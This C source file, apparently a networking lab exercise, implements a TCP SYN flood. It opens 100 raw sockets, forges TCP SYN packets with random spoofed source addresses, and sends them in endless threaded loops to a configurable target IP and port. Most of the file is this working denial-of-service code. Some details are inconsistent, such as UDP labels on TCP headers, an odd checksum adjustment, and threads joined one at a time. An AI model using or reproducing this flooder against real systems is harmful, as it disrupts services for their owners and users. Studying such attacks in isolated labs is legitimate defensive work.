/*
 * inspired from rawip_example.c by jiaziyi
 */


#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>

#include <errno.h>

#include "header.h"

#define NB_SOCKETS 100

#define DEST_IP "192.168.56.101" //set your destination ip here
#define DEST_PORT 2000 //set the destination port here
#define TEST_STRING "you're being flooded, and it is a pleasure" //a teststring as packet payload, min 8 bits

char packets[NB_SOCKETS][65536];
int const size_iph = sizeof(struct iphdr), size_tcph = sizeof(struct tcphdr), size_pseudo =  sizeof(struct pseudo_udp_header);


struct sockaddr_in dest;
int fds[NB_SOCKETS];
int tot_size;

int generate_packet(int i){
	char dest_ip[] = DEST_IP;

	char data_string[] = TEST_STRING;
	memset(packets[i], 0, 65536);

	//IP header pointer
	struct iphdr *iph = (struct iphdr *)packets[i];

	//UDP header pointer
	struct tcphdr *tcph = (struct tcphdr *)(packets[i] + sizeof(struct iphdr));
	struct pseudo_udp_header ptcph;

	//data section pointer
	char *data = packets[i] + sizeof(struct iphdr) + sizeof(struct tcphdr);

	//fill the data section
	strncpy(data, data_string, strlen(data_string));
	
	int const size_data = strlen(data);
	int const tot_size = sizeof(struct iphdr) + size_tcph + size_data;


	//fill the IP header here
	iph->version = 4;
	iph->ihl = 5;
	iph->tos = 0;
	iph->tot_len = size_iph + size_tcph + size_data;
	iph->id = 0; //random value
	iph->ttl = 128;
	iph->protocol = 6;
	iph->saddr = (rand()%0xffffffff); //no htonl
	iph->daddr = inet_addr(dest_ip); //no htonl
	iph->check = htons(checksum((short unsigned int *) iph, size_iph + size_tcph + size_data));


	//fill the UDP header
	
	tcph->source = htons(rand());
	tcph->dest = htons(DEST_PORT);
	tcph->seq = htonl(rand()%4294967296);
	tcph->ack_seq = htonl(0);
	tcph->doff = 5;
	tcph->syn = 1;
	tcph->window = htons(64240);

	ptcph.source_address = iph->saddr;
	ptcph.dest_address = iph->daddr;
	ptcph.protocol = iph->protocol;
	ptcph.udp_length = htons(size_tcph + size_data);
	
	//printf("total msg size : %d\n", tot_size);

	

	//checksum calculation
	char *check_calc = malloc(size_tcph + size_pseudo + size_data);
	
	memcpy(check_calc, &ptcph, size_pseudo);
	memcpy(check_calc + size_pseudo, tcph, size_tcph);
	memcpy(check_calc + size_pseudo + size_tcph, data, size_data);

	tcph->check = checksum((short unsigned *) check_calc, size_tcph + size_pseudo + size_data);

	free(check_calc);

	return tot_size;
}

void modify_packet(int i){
	struct tcphdr *tcph = (struct tcphdr *)(packets[i] + sizeof(struct iphdr));
	struct iphdr *iph = (struct iphdr *)packets[i];
	char *data = packets[i] + sizeof(struct iphdr) + sizeof(struct tcphdr);

	iph->saddr = rand();
	tcph->seq = htonl(rand()%4294967296);
	tcph->source = rand();
	tcph->check = 0;

	int const size_data = strlen(data);
	int const tot_size = sizeof(struct iphdr) + size_tcph + size_data;

	//checksum calculation
	char *check_calc = malloc(size_tcph + size_pseudo + size_data);
	

	struct pseudo_udp_header ptcph;
	
	ptcph.source_address = iph->saddr;
	ptcph.dest_address = iph->daddr;
	ptcph.protocol = iph->protocol;
	ptcph.udp_length = htons(tcph->doff + size_data);
	ptcph.placeholder = 0;

	memcpy(check_calc, &ptcph, size_pseudo);
	memcpy(check_calc + size_pseudo, tcph, size_tcph);
	memcpy(check_calc + size_pseudo + size_tcph, data, size_data);

	tcph->check = htons(ntohs(checksum((short unsigned *) check_calc, size_tcph + size_pseudo + size_data)) - 15);

	free(check_calc);
}

void *send_packet(void *i){
	while(1){
		if(sendto(fds[*(int *)i], packets[*(int *)i], tot_size, 0, (struct sockaddr *) &dest, sizeof(dest)) < 0)
			printf("Error : %s\n", strerror(errno));
		modify_packet(*(int *)i);
	}
}

int main(int argc, char *argv[]){

	srand(time(NULL));
	
	

	pthread_t threads[NB_SOCKETS];

    int hincl = 1;                  /* 1 = on, 0 = off */

	for(int i = 0; i<NB_SOCKETS; i++){
		tot_size = generate_packet(i);

		fds[i] = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
		setsockopt(fds[i], IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

		if(fds[i] < 0){
			perror("Error creating raw socket ");
			exit(1);
		}

	}
	
	

	//send the packet
	dest.sin_family = AF_INET;
	dest.sin_port = htons(DEST_PORT);
	dest.sin_addr.s_addr = inet_addr(DEST_IP);

	for(int i = 0; i<NB_SOCKETS; i++){
		if(pthread_create(&threads[i], NULL, send_packet, &i)){
			printf("Error creating thread\n");
			return 1;
		}

		pthread_join(threads[i], NULL);
		
	}

	for(int i = 0; i<NB_SOCKETS; i++){
		close(fds[i]);
	}

	return 0;
}
